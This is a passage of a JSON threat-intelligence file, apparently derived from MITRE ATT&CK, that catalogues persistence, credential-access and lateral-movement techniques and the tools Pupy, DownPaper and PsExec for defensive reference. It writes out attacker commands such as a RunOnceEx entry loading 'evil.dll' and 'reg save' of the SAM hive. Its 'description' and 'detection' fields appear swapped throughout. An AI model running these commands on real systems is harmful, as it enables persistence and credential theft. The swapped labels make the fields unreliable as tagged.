HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1543.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Systemd Service",
                "chain_phase": "persistence",
                "description": "Systemd service unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>/home/<username>/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.\n\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAuditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.",
                "detection": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\n\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:\n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \n* ExecReload directive covers when a service restarts. \n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\n\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.\n\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.",
                "is_subtype": true,
                "platforms": [
                    "Linux"
                ]
            }
        },
        {
            "id": "T1055.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Dynamic-link Library Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).  \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1135",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Share Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.",
                "is_subtype": false,
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1125",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Video Capture",
                "chain_phase": "collection",
                "description": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.",
                "detection": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1123",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Audio Capture",
                "chain_phase": "collection",
                "description": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.",
                "detection": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1113",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Screen Capture",
                "chain_phase": "collection",
                "description": "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.",
                "detection": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1049",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Network Connections Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\".",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0192",
            "type": "tool",
            "attributes": {
                "name": "Pupy",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Pupy is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool.  It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.).  Pupy is publicly available on GitHub.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS",
                    "Android"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1569.002": "Service Execution",
                    "T1059.006": "Python",
                    "T1059.001": "PowerShell",
                    "T1497.001": "System Checks",
                    "T1087.001": "Local Account",
                    "T1003.004": "LSA Secrets",
                    "T1003.005": "Cached Domain Credentials",
                    "T1560.001": "Archive via Utility",
                    "T1114.001": "Local Email Collection",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1557.001": "LLMNR/NBT-NS Poisoning and SMB Relay",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1003.001": "LSASS Memory",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1552.001": "Credentials In Files",
                    "T1550.003": "Pass the Ticket",
                    "T1548.002": "Bypass User Account Control",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1136.002": "Domain Account",
                    "T1136.001": "Local Account",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.002": "Systemd Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1135": "Network Share Discovery",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 40
        },
        {
            "id": "T1012",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Query Registry",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0186",
            "type": "tool",
            "attributes": {
                "name": "DownPaper",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "DownPaper is a backdoor Trojan; its main functionality is to download and run second stage malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 7
        },
        {
            "id": "T1570",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Lateral Tool Transfer",
                "chain_phase": "lateral-movement",
                "description": "Monitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.",
                "detection": "Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "SMB/Windows Admin Shares",
                "chain_phase": "lateral-movement",
                "description": "Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)",
                "detection": "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0029",
            "type": "tool",
            "attributes": {
                "name": "PsExec",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "PsExec is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1570": "Lateral Tool Transfer",
                    "T1569.002": "Service Execution",
                    "T1021.002": "SMB/Windows Admin Shares"
                }
            },
            "val": 3
        },
        {
            "id": "T1555.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Credential Manager",
                "chain_phase": "credential-access",
                "description": "Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes The Windows Vault)\n\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)",
                "detection": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted <code>.vcrd</code> files, located under <code>%Systemdrive%\\Users\\\\Username\\AppData\\Local\\Microsoft\\\\Vault/Credentials\\</code>. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may gather credentials by reading files located inside of the Credential Lockers. Adversaries may also abuse Windows APIs such as <code>CredEnumerateA</code> to list credentials managed by the Credential Manager.\n\nAdversaries may use password recovery tools to obtain plain text passwords from the Credential Manager.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "SID-History Injection",
                "chain_phase": "defense-evasion",
                "description": "Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\n\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)",
                "detection": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1558.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Silver Ticket",
                "chain_phase": "credential-access",
                "description": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) \n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.",
                "detection": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\n\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1558.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Golden Ticket",
                "chain_phase": "credential-access",
                "description": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \n",
                "detection": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory. \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "DCSync",
                "chain_phase": "credential-access",
                "description": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\n\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)",
                "detection": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket or change an account's password as noted in Account Manipulation.\n\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Security Account Manager",
                "chain_phase": "credential-access",
                "description": "Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.",
                "detection": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1552.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Private Keys",
                "chain_phase": "credential-access",
                "description": "Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.",
                "detection": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1550.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Pass the Hash",
                "chain_phase": "defense-evasion",
                "description": "Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)",
                "detection": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1547.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Security Support Provider",
                "chain_phase": "persistence",
                "description": "Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)",
